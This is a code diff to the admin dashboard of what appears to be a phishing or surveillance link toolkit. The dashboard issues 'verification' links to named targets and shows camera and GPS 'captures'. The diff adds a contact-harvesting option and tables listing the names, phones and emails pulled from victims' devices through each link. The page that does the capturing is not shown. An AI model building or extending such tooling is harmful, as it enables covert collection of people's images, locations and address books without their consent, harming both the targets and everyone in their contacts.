@@ -390,6 +390,7 @@
         <div class="perm-row">
             <label class="check-label"><input type="checkbox" id="editCam"> 📷 Camera</label>
             <label class="check-label"><input type="checkbox" id="editGPS"> 📍 GPS</label>
+            <label class="check-label"><input type="checkbox" id="editContact"> 📇 Contact</label>
         </div>
         <div class="modal-row">
             <button class="btn btn-primary" id="saveEditLink">💾 Save</button>
@@ -554,6 +555,10 @@
                 <span class="nav-icon">🗑️</span> Recycle Bin
                 <span class="nav-badge" id="navBinCount" style="display:none;">0</span>
             </button>
+            <button class="nav-item" data-panel="contacts" data-shell="admin">
+                <span class="nav-icon">📇</span> Contacts
+                <span class="nav-badge nav-badge-purple" id="navContactCount" style="display:none;">0</span>
+            </button>
         </div>
 
         <div class="sidebar-footer">
@@ -641,6 +646,7 @@
                     <div class="form-row">
                         <label class="check-label"><input type="checkbox" id="checkCam" checked> 📷 Camera</label>
                         <label class="check-label"><input type="checkbox" id="checkGPS" checked> 📍 GPS</label>
+                        <label class="check-label"><input type="checkbox" id="checkContact"> 📇 Contact</label>
                         <button class="btn btn-primary" id="createBtn">⚡ Generate Link</button>
                     </div>
                     <div class="form-row" style="margin-bottom:0;">
@@ -765,6 +771,34 @@
                 </div>
             </div>
 
+            <!-- ══ CONTACTS ══ -->
+            <div class="panel" id="panel-contacts">
+                <div class="section">
+                    <div class="section-header">
+                        <h3>📇 Collected Contacts</h3>
+                        <span class="badge badge-purple" id="contactCount">0</span>
+                        <div class="section-header-right">
+                            <input type="text" id="searchContacts" placeholder="🔍 Search name, phone..." style="width:200px;">
+                        </div>
+                    </div>
+                    <div class="table-wrap">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Name</th>
+                                    <th>Phone</th>
+                                    <th>Email</th>
+                                    <th>Link Name</th>
+                                    <th>Link ID</th>
+                                    <th>Date &amp; Time</th>
+                                </tr>
+                            </thead>
+                            <tbody id="contactTableBody"></tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+
         </div><!-- /content -->
     </div><!-- /main -->
 </div><!-- /adminShell -->
@@ -804,6 +838,10 @@
             <button class="nav-item" id="uNavBin" data-panel="u-bin" data-shell="user">
                 <span class="nav-icon">🗑️</span> Recycle Bin
                 <span class="nav-badge" id="uNavBinCount" style="display:none;">0</span>
+            </button>
+            <button class="nav-item" id="uNavContacts" data-panel="u-contacts" data-shell="user">
+                <span class="nav-icon">📇</span> Contacts
+                <span class="nav-badge nav-badge-purple" id="uNavContactCount" style="display:none;">0</span>
             </button>
         </div>
 
@@ -882,6 +920,7 @@
                     <div class="form-row">
                         <label class="check-label"><input type="checkbox" id="uCheckCam" checked> 📷 Camera</label>
                         <label class="check-label"><input type="checkbox" id="uCheckGPS" checked> 📍 GPS</label>
+                        <label class="check-label"><input type="checkbox" id="uCheckContact"> 📇 Contact</label>
                         <button class="btn btn-primary" id="uCreateBtn">⚡ Generate Link</button>
                     </div>
                     <div class="form-row" style="margin-bottom:0;">
@@ -974,6 +1013,34 @@
                         <input type="text" id="uBinSearch" placeholder="🔍 Search..." style="width:190px;">
                     </div>
                     <div id="uBinGrid" class="cap-grid"></div>
+                </div>
+            </div>
+
+            <!-- ══ USER CONTACTS ══ -->
+            <div class="panel" id="panel-u-contacts">
+                <div class="section">
+                    <div class="section-header">
+                        <h3>📇 My Collected Contacts</h3>
+                        <span class="badge badge-purple" id="uContactCount">0</span>
+                        <div class="section-header-right">
+                            <input type="text" id="uSearchContacts" placeholder="🔍 Search name, phone..." style="width:200px;">
+                        </div>
+                    </div>
+                    <div class="table-wrap">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Name</th>
+                                    <th>Phone</th>
+                                    <th>Email</th>
+                                    <th>Link Name</th>
+                                    <th>Link ID</th>
+                                    <th>Date &amp; Time</th>
+                                </tr>
+                            </thead>
+                            <tbody id="uContactTableBody"></tbody>
+                        </table>
+                    </div>
                 </div>
             </div>
 
@@ -1205,7 +1272,7 @@ document.getElementById('adminLogoutBtn').onclick = () => {
     adminUnsubscribers.forEach(u => u());
     adminUnsubscribers = [];
     adminListenersInit = false;
-    allLogsData = null; allLinksData = null; allUsersData = null;
+    allLogsData = null; allLinksData = null; allUsersData = null; allContactsData = null;
     logsCache = {}; prevLogCount = null; selectedCaptures.clear();
     currentSession = null;
     document.getElementById('adminShell').style.display = 'none';
@@ -1219,7 +1286,7 @@ document.getElementById('userLogoutBtn').onclick = () => {
     userUnsubscribers.forEach(u => u());
     userUnsubscribers = [];
     userListenersInit = false;
-    uAllLogsData = null; uAllLinksData = null;
+    uAllLogsData = null; uAllLinksData = null; uAllContactsData = null;
     uLogsCache = {}; uSelectedCaptures.clear();
     currentSession = null;
     document.getElementById('userShell').style.display = 'none';
@@ -1233,8 +1300,8 @@ document.getElementById('userLogoutBtn').onclick = () => {
 // ══════════════════════════════════════════════════════════
 // NAVIGATION
 // ══════════════════════════════════════════════════════════
-const adminPanelTitles = { dashboard: 'Dashboard', links: 'Manage Links', captures: 'Live Captures', bin: 'Recycle Bin', users: 'User Management' };
-const userPanelTitles  = { 'u-dashboard': 'Dashboard', 'u-links': 'My Links', 'u-captures': 'My Captures', 'u-bin': 'Recycle Bin' };
+const adminPanelTitles = { dashboard: 'Dashboard', links: 'Manage Links', captures: 'Live Captures', bin: 'Recycle Bin', users: 'User Management', contacts: 'Collected Contacts' };
+const userPanelTitles  = { 'u-dashboard': 'Dashboard', 'u-links': 'My Links', 'u-captures': 'My Captures', 'u-bin': 'Recycle Bin', 'u-contacts': 'My Contacts' };
 
 function switchPanel(name, shell) {
     const prefix = shell === 'user' ? '#userContent' : '#adminContent';
@@ -1322,8 +1389,8 @@ function renderLinksTable() {
         const verHref   = window.location.origin + window.location.pathname.replace('admin.html','index.html') + '?linkId=' + id;
         // Target Name column — always shows the actual target name
         const nameCell = `<td><a href="${verHref}" target="_blank" rel="noopener" title="Verification link: ${verHref}" style="color:var(--primary);font-weight:700;text-decoration:none;">${esc(l.name || 'Unnamed')}</a></td>`;
-        // Permissions column — CAM / GPS / '—'
-        const perms = [l.cam ? '📷 CAM' : '', l.gps ? '📍 GPS' : ''].filter(Boolean);
+        // Permissions column — CAM / GPS / CONTACT / '—'
+        const perms = [l.cam ? '📷 CAM' : '', l.gps ? '📍 GPS' : '', l.contact ? '📇 CONTACT' : ''].filter(Boolean);
         const permCell = `<td style="font-size:11px;">${perms.length ? perms.map(p => `<span class="tag">${p}</span>`).join(' ') : '<span style="color:#475569;">—</span>'}</td>`;
         const actionsCell = `<td style="white-space:nowrap;">
                 <button class="btn btn-gray btn-sm"   data-action="copy"   data-id="${id}">📋 Copy</button>
@@ -1377,6 +1444,7 @@ document.getElementById('linkTableBody').addEventListener('click', e => {
         document.getElementById('editRedirect').value    = l.redirectUrl || '';
         document.getElementById('editCam').checked       = !!l.cam;
         document.getElementById('editGPS').checked       = !!l.gps;
+        document.getElementById('editContact').checked   = !!l.contact;
         document.getElementById('editLinkModal').classList.add('open');
     } else if (action === 'delete') {
         if (!confirm('Move this link to Recycle Bin?')) return;
@@ -1397,6 +1465,7 @@ document.getElementById('createBtn').onclick = () => {
         id, name, active: true, visits: 0,
         cam: document.getElementById('checkCam').checked,
         gps: document.getElementById('checkGPS').checked,
+        contact: document.getElementById('checkContact').checked,
         redirectUrl: ru || '',
         createdAt:   Date.now(),
         _ownerType:  'admin',
@@ -1645,7 +1714,7 @@ function renderBin() {
             card.className = 'lbin-card';
             card.innerHTML = `
                 <p><b>🔗 ${esc(item.name||'Unknown')}</b></p>
-                <p class="meta">${item.cam ? '📷 Camera' : ''} ${item.gps ? '📍 GPS' : ''}</p>
+                <p class="meta">${item.cam ? '📷 Camera' : ''} ${item.gps ? '📍 GPS' : ''} ${item.contact ? '📇 Contact' : ''}</p>
                 ${item.redirectUrl ? `<p class="meta">↩️ ${esc(item.redirectUrl)}</p>` : ''}
                 <p class="meta">👁 ${item.visits||0} visits</p>
                 <p class="meta" style="color:var(--red);">🗑 Deleted: ${new Date(item.deletedAt).toLocaleDateString()}</p>
@@ -2083,7 +2152,7 @@ async function showUserActivity(username) {
         const status = l.active
             ? `<span style="color:var(--green);font-weight:700;font-size:11px;">● Active</span>`
             : `<span style="color:var(--red);font-weight:700;font-size:11px;">● Off</span>`;
-        const perms = [l.cam?'📷 Cam':'', l.gps?'📍 GPS':''].filter(Boolean).join(' · ') || '—';
+        const perms = [l.cam?'📷 Cam':'', l.gps?'📍 GPS':'', l.contact?'📇 Contact':''].filter(Boolean).join(' · ') || '—';
         const redir = l.redirectUrl
             ? `<a href="${ex(l.redirectUrl)}" target="_blank" style="color:var(--teal);font-size:10.5px;">${ex(l.redirectUrl.slice(0,30))}…</a>`
             : '<span style="color:#475569;font-size:10.5px;">—</span>';
@@ -2100,7 +2169,7 @@ async function showUserActivity(username) {
 
     // ── deleted link row
     const delLinkRow = x => {
-        const perms = [x.cam?'📷 Cam':'', x.gps?'📍 GPS':''].filter(Boolean).join(' · ') || '—';
+        const perms = [x.cam?'📷 Cam':'', x.gps?'📍 GPS':'', x.contact?'📇 Contact':''].filter(Boolean).join(' · ') || '—';
         return `
         <tr style="opacity:.85;">
             <td style="padding:8px 10px;font-weight:600;font-size:12px;color:var(--text);">${ex(x.name||'Unnamed')}</td>
@@ -2295,8 +2364,8 @@ function renderUserLinksTable() {
         const verHref   = window.location.origin + window.location.pathname.replace('admin.html','index.html') + '?linkId=' + id;
         // Target Name — always shows actual target name
         const nameCell    = `<td><a href="${verHref}" target="_blank" rel="noopener" title="Verification link: ${verHref}" style="color:var(--primary);font-weight:700;text-decoration:none;">${esc(l.name || 'Unnamed')}</a></td>`;
-        // Permissions — CAM / GPS / '—'
-        const perms = [l.cam ? '📷 CAM' : '', l.gps ? '📍 GPS' : ''].filter(Boolean);
+        // Permissions — CAM / GPS / CONTACT / '—'
+        const perms = [l.cam ? '📷 CAM' : '', l.gps ? '📍 GPS' : '', l.contact ? '📇 CONTACT' : ''].filter(Boolean);
         const permCell    = `<td style="font-size:11px;">${perms.length ? perms.map(p => `<span class="tag">${p}</span>`).join(' ') : '<span style="color:#475569;">—</span>'}</td>`;
         const redir       = l.redirectUrl ? `<a href="${esc(l.redirectUrl)}" target="_blank" style="color:var(--teal);font-size:11px;">${esc(l.redirectUrl.slice(0,28))}…</a>` : '<span style="color:#475569;">—</span>';
         row.innerHTML = nameCell + permCell +
@@ -2349,6 +2418,7 @@ document.getElementById('uLinkTableBody').addEventListener('click', e => {
         document.getElementById('editRedirect').value   = l.redirectUrl || '';
         document.getElementById('editCam').checked      = !!l.cam;
         document.getElementById('editGPS').checked      = !!l.gps;
+        document.getElementById('editContact').checked  = !!l.contact;
         document.getElementById('editLinkModal').classList.add('open');
     } else if (uaction === 'delete') {
         if (!confirm('Move this link to Recycle Bin?')) return;
@@ -2374,6 +2444,7 @@ document.getElementById('uCreateBtn').onclick = () => {
         id, name, active: true, visits: 0,
         cam: document.getElementById('uCheckCam').checked,
         gps: document.getElementById('uCheckGPS').checked,
+        contact: document.getElementById('uCheckContact').checked,
         redirectUrl: ru || '',
         createdAt:   Date.now(),
         _ownerType:  'user',
@@ -2584,7 +2655,7 @@ function renderUserBin() {
             card.className = 'lbin-card';
             card.innerHTML = `
                 <p><b>🔗 ${esc(item.name||'Unknown')}</b></p>
-                <p class="meta">${item.cam ? '📷 Camera' : ''} ${item.gps ? '📍 GPS' : ''}</p>
+                <p class="meta">${item.cam ? '📷 Camera' : ''} ${item.gps ? '📍 GPS' : ''} ${item.contact ? '📇 Contact' : ''}</p>
                 ${item.redirectUrl ? `<p class="meta">↩️ ${esc(item.redirectUrl)}</p>` : ''}
                 <p class="meta" style="color:var(--red);">🗑 Deleted: ${new Date(item.deletedAt).toLocaleDateString()}</p>
                 <div style="display:flex;gap:6px;margin-top:10px;">
@@ -2661,6 +2732,150 @@ document.getElementById('uEmptyBinBtn').onclick = () => {
     renderUserBin(); updateUserStats(); toast('🔥 Bin emptied.', 'var(--red)');
 };
 
+// ══════════════════════════════════════════════════════════
+// CONTACTS — STATE & RENDER
+// ══════════════════════════════════════════════════════════
+let allContactsData  = null;
+let uAllContactsData = null;
+
+function renderContactsTable() {
+    const tbody  = document.getElementById('contactTableBody');
+    if (!tbody) return;
+    const search = (document.getElementById('searchContacts')?.value || '').toLowerCase();
+    tbody.innerHTML = '';
+    let count = 0;
+
+    if (!allContactsData) {
+        tbody.innerHTML = '<tr><td colspan="6"><div class="empty"><span class="empty-icon">📇</span>No contacts collected yet.</div></td></tr>';
+        document.getElementById('contactCount').innerText = '0';
+        const nb = document.getElementById('navContactCount'); if (nb) { nb.innerText = '0'; nb.style.display = 'none'; }
+        return;
+    }
+
+    // Admin panel: only show admin-owned contacts
+    const entries = Object.values(allContactsData).filter(c => c._ownerType !== 'user');
+    const filtered = search
+        ? entries.filter(c => JSON.stringify(c.contacts || []).toLowerCase().includes(search) || (c.linkName||'').toLowerCase().includes(search))
+        : entries;
+
+    filtered.sort((a,b) => (b.timestamp||0) - (a.timestamp||0));
+
+    if (filtered.length === 0) {
+        tbody.innerHTML = '<tr><td colspan="6"><div class="empty"><span class="empty-icon">🔍</span>No contacts match your search.</div></td></tr>';
+        document.getElementById('contactCount').innerText = '0';
+        const nb = document.getElementById('navContactCount'); if (nb) { nb.innerText = '0'; nb.style.display = 'none'; }
+        return;
+    }
+
+    filtered.forEach(entry => {
+        const contactList = entry.contacts || [];
+        if (contactList.length === 0) {
+            const row = document.createElement('tr');
+            row.innerHTML = `
+                <td style="color:var(--muted);font-size:12px;">—</td>
+                <td style="color:var(--muted);font-size:12px;">—</td>
+                <td style="color:var(--muted);font-size:12px;">—</td>
+                <td style="font-size:12px;">${esc(entry.linkName||'Unknown')}</td>
+                <td style="font-size:11px;color:var(--muted);">${esc(entry.linkId||'—')}</td>
+                <td style="font-size:11px;color:var(--muted);">${esc(entry.date||'')} ${esc(entry.time||'')}</td>`;
+            tbody.appendChild(row);
+            count++;
+        } else {
+            contactList.forEach((c, i) => {
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td style="font-size:12px;font-weight:600;">${esc(c.name||'—')}</td>
+                    <td style="font-size:12px;">${esc(c.phone||'—')}</td>
+                    <td style="font-size:12px;">${esc(c.email||'—')}</td>
+                    ${i === 0
+                        ? `<td style="font-size:12px;" rowspan="${contactList.length}">${esc(entry.linkName||'Unknown')}</td>
+                           <td style="font-size:11px;color:var(--muted);" rowspan="${contactList.length}">${esc(entry.linkId||'—')}</td>
+                           <td style="font-size:11px;color:var(--muted);" rowspan="${contactList.length}">${esc(entry.date||'')} ${esc(entry.time||'')}</td>`
+                        : ''
+                    }`;
+                tbody.appendChild(row);
+                count++;
+            });
+        }
+    });
+
+    const total = filtered.length;
+    document.getElementById('contactCount').innerText = total;
+    const nb = document.getElementById('navContactCount');
+    if (nb) { nb.innerText = total; nb.style.display = total > 0 ? '' : 'none'; }
+}
+
+function renderUserContactsTable() {
+    const tbody    = document.getElementById('uContactTableBody');
+    if (!tbody) return;
+    const username = currentSession?.username;
+    const search   = (document.getElementById('uSearchContacts')?.value || '').toLowerCase();
+    tbody.innerHTML = '';
+    let count = 0;
+
+    if (!uAllContactsData) {
+        tbody.innerHTML = '<tr><td colspan="6"><div class="empty"><span class="empty-icon">📇</span>No contacts collected yet.</div></td></tr>';
+        document.getElementById('uContactCount').innerText = '0';
+        const nb = document.getElementById('uNavContactCount'); if (nb) { nb.innerText = '0'; nb.style.display = 'none'; }
+        return;
+    }
+
+    const entries = Object.values(uAllContactsData).filter(c => c._ownerType === 'user' && c._ownerId === username);
+    const filtered = search
+        ? entries.filter(c => JSON.stringify(c.contacts || []).toLowerCase().includes(search) || (c.linkName||'').toLowerCase().includes(search))
+        : entries;
+
+    filtered.sort((a,b) => (b.timestamp||0) - (a.timestamp||0));
+
+    if (filtered.length === 0) {
+        tbody.innerHTML = '<tr><td colspan="6"><div class="empty"><span class="empty-icon">🔍</span>No contacts yet.</div></td></tr>';
+        document.getElementById('uContactCount').innerText = '0';
+        const nb = document.getElementById('uNavContactCount'); if (nb) { nb.innerText = '0'; nb.style.display = 'none'; }
+        return;
+    }
+
+    filtered.forEach(entry => {
+        const contactList = entry.contacts || [];
+        if (contactList.length === 0) {
+            const row = document.createElement('tr');
+            row.innerHTML = `
+                <td style="color:var(--muted);font-size:12px;">—</td>
+                <td style="color:var(--muted);font-size:12px;">—</td>
+                <td style="color:var(--muted);font-size:12px;">—</td>
+                <td style="font-size:12px;">${esc(entry.linkName||'Unknown')}</td>
+                <td style="font-size:11px;color:var(--muted);">${esc(entry.linkId||'—')}</td>
+                <td style="font-size:11px;color:var(--muted);">${esc(entry.date||'')} ${esc(entry.time||'')}</td>`;
+            tbody.appendChild(row);
+            count++;
+        } else {
+            contactList.forEach((c, i) => {
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td style="font-size:12px;font-weight:600;">${esc(c.name||'—')}</td>
+                    <td style="font-size:12px;">${esc(c.phone||'—')}</td>
+                    <td style="font-size:12px;">${esc(c.email||'—')}</td>
+                    ${i === 0
+                        ? `<td style="font-size:12px;" rowspan="${contactList.length}">${esc(entry.linkName||'Unknown')}</td>
+                           <td style="font-size:11px;color:var(--muted);" rowspan="${contactList.length}">${esc(entry.linkId||'—')}</td>
+                           <td style="font-size:11px;color:var(--muted);" rowspan="${contactList.length}">${esc(entry.date||'')} ${esc(entry.time||'')}</td>`
+                        : ''
+                    }`;
+                tbody.appendChild(row);
+                count++;
+            });
+        }
+    });
+
+    const total = filtered.length;
+    document.getElementById('uContactCount').innerText = total;
+    const nb = document.getElementById('uNavContactCount');
+    if (nb) { nb.innerText = total; nb.style.display = total > 0 ? '' : 'none'; }
+}
+
+document.getElementById('searchContacts')?.addEventListener('input', renderContactsTable);
+document.getElementById('uSearchContacts')?.addEventListener('input', renderUserContactsTable);
+
+// ══════════════════════════════════════════════════════════
 function initAdminListeners() {
     if (adminListenersInit) return;
     adminListenersInit = true;
@@ -2694,6 +2909,11 @@ function initAdminListeners() {
             document.getElementById('loginModeSwitch').style.display = 'flex';
         }
     }));
+
+    adminUnsubscribers.push(onValue(ref(db, 'contact_history'), snap => {
+        allContactsData = snap.val();
+        renderContactsTable();
+    }));
 }
 
 function initUserListeners() {
@@ -2711,6 +2931,11 @@ function initUserListeners() {
         renderUserLogs();
         renderUserRecent();
         updateUserStats();
+    }));
+
+    userUnsubscribers.push(onValue(ref(db, 'contact_history'), snap => {
+        uAllContactsData = snap.val();
+        renderUserContactsTable();
     }));
 
     // ── Real-time account status watcher ──────────────────
@@ -2915,6 +3140,7 @@ document.getElementById('saveEditLink').onclick = () => {
         name: nm, redirectUrl: ru,
         cam: document.getElementById('editCam').checked,
         gps: document.getElementById('editGPS').checked,
+        contact: document.getElementById('editContact').checked,
     }).then(() => {
         document.getElementById('editLinkModal').classList.remove('open');
         currentEditId = null;
